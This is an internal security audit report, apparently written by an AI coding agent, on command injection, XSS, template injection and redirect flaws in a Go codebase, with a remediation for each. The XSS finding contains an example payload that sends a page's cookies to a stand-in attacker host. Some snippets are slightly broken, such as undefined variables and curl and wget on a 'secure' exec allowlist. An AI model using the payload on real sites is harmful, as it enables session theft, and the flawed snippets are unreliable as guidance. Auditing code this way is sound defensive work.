# Security Audit Report - 2026-01-30

## Overview

Security audit of the Unheaded Kingdom codebase for prompt injection, command injection, and XSS attack vectors.

**Status:** Known issues documented for remediation
**Auditor:** Claude Code
**Scope:** `cmd/`, `pkg/` directories

---

## Critical Vulnerabilities

### 1. Command Injection via Hook System

**File:** `pkg/deploy/pipeline/hooks.go`
**Lines:** 251, 405-410
**Severity:** CRITICAL

**Description:**
User-provided scripts are executed directly via `bash -c` without sanitization:

```go
// Line 405
case "bash", "sh":
    cmd = exec.CommandContext(ctx, "bash", "-c", hook.Config.Script)
case "python":
    cmd = exec.CommandContext(ctx, "python", "-c", hook.Config.Script)
```

**Attack Vector:**
If `hook.Config.Script` originates from user input (API, config file), arbitrary commands execute.

**Remediation:**
- Validate hook sources - only allow from trusted config
- Implement command allowlist for exec hooks
- Sandbox hook execution (containers, seccomp)
- Add audit logging for all hook executions

---

### 2. XSS in WAF Response Pages

**File:** `pkg/waf/response/response.go`
**Lines:** 190-240, 292
**Severity:** CRITICAL

**Description:**
String concatenation embeds `requestID` without HTML escaping:

```go
// Line 237
return `...Request ID: ` + requestID + `...`
```

**Attack Vector:**
If `requestID` derives from user input:
```
requestID = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
```

**Remediation:**
- Use `html/template` package instead of string concatenation
- Apply `template.HTMLEscapeString()` to all user-controlled data
- Generate `requestID` server-side using crypto/rand UUID

---

### 3. Template Injection in Custom Block Pages

**File:** `pkg/waf/response/response.go`
**Lines:** 113-120
**Severity:** CRITICAL

**Description:**
Custom block page HTML parsed as Go template with user data:

```go
tmpl, err := template.New("block").Parse(h.blockPage)
data := map[string]string{
    "Reason":    reason,
    "RuleID":    ruleID,
    "RequestID": requestID,
}
_ = tmpl.Execute(w, data)
```

**Attack Vector:**
If `blockPage` comes from config that users can modify, template directives execute.

**Remediation:**
- Pre-compile templates at startup, not runtime
- Validate blockPage against template injection patterns
- Use `text/template` with restricted function map

---

## High Priority Vulnerabilities

### 4. Health Check Command Execution

**File:** `pkg/health/aggregator.go`
**Line:** 948
**Severity:** HIGH

**Description:**
```go
cmd := exec.CommandContext(ctx, check.Target, config.Args...)
```

**Attack Vector:**
User-modifiable health check config allows arbitrary command execution.

**Remediation:**
- Allowlist permitted health check commands
- Validate Target against approved binaries
- Sanitize Args array

---

### 5. Network Policy Command Injection

**File:** `pkg/network/policy_controller.go`
**Lines:** 1621, 1653, 1725
**Severity:** HIGH

**Description:**
Multiple shell commands constructed with policy data:
- `iptables` rules (line 1621)
- `nft` nftables rules (line 1653)
- `vtysh` configuration (line 1725)

**Attack Vector:**
Policy rule names or values containing shell metacharacters.

**Remediation:**
- Use native Go libraries instead of shell commands where possible
- Strict input validation on policy names/values
- Escape shell metacharacters
- Consider netlink for iptables operations

---

### 6. Environment Variable Injection

**File:** `pkg/deploy/pipeline/hooks.go`
**Lines:** 415-420
**Severity:** HIGH

**Description:**
```go
for key, value := range pipelineCtx {
    cmd.Env = append(cmd.Env, fmt.Sprintf("PIPELINE_%s=%s", strings.ToUpper(key), v))
}
```

**Attack Vector:**
If `pipelineCtx` contains user-controlled values with shell metacharacters.

**Remediation:**
- Sanitize environment variable values
- Validate key names against allowlist
- Remove special characters from values

---

## Medium Priority Vulnerabilities

### 7. Open Redirect

**File:** `pkg/waf/response/response.go`
**Lines:** 129-144
**Severity:** MEDIUM

**Description:**
```go
func (h *Handler) Redirect(w http.ResponseWriter, r *http.Request, url string) {
    http.Redirect(w, r, targetURL, http.StatusFound)
}
```

**Remediation:**
- Validate redirect URLs against allowlist of domains
- Only allow relative redirects or same-origin

---

### 8. HTTP Header Injection

**File:** `pkg/waf/response/response.go`
**Lines:** 57-81
**Severity:** MEDIUM

**Description:**
Custom headers set without CRLF validation.

**Remediation:**
- Validate header values for CRLF sequences
- Use `textproto.CanonicalMIMEHeaderKey` for keys

---

## Remediation Priority

| Priority | Issue | Effort | Impact |
|----------|-------|--------|--------|
| P0 | XSS in WAF responses | Low | High |
| P0 | Command injection in hooks | Medium | Critical |
| P1 | Template injection | Low | High |
| P1 | Health check exec | Medium | High |
| P2 | Network policy commands | High | High |
| P2 | Environment injection | Low | Medium |
| P3 | Open redirect | Low | Low |
| P3 | Header injection | Low | Low |

---

## Recommended Security Patterns

### Input Validation Layer

```go
// pkg/security/validate/validate.go
package validate

import (
    "regexp"
    "strings"
)

var (
    safeIdentifier = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)
    shellMeta      = regexp.MustCompile(`[;&|$` + "`" + `\\'"<>(){}[\]!#~*?]`)
)

func Identifier(s string) bool {
    return safeIdentifier.MatchString(s)
}

func SanitizeForShell(s string) string {
    return shellMeta.ReplaceAllString(s, "")
}

func HTMLEscape(s string) string {
    // Use html.EscapeString
}
```

### Secure Exec Pattern

```go
// Only allow pre-approved commands
var allowedCommands = map[string]bool{
    "/usr/bin/curl":  true,
    "/usr/bin/wget":  true,
    "/bin/echo":      true,
}

func SecureExec(ctx context.Context, cmd string, args []string) error {
    if !allowedCommands[cmd] {
        return ErrCommandNotAllowed
    }
    // Validate args...
}
```

---

## Notes

- WAF module marked for Rust rewrite per timeline.md - security fixes should be done in Rust version
- Hook system is powerful but dangerous - consider sandboxed execution
- All user-facing templates should use html/template with autoescaping

---

## Sign-off

**Documented:** 2026-01-30
**Next Review:** Before production deployment
**Tracking:** GitHub Issues TBD
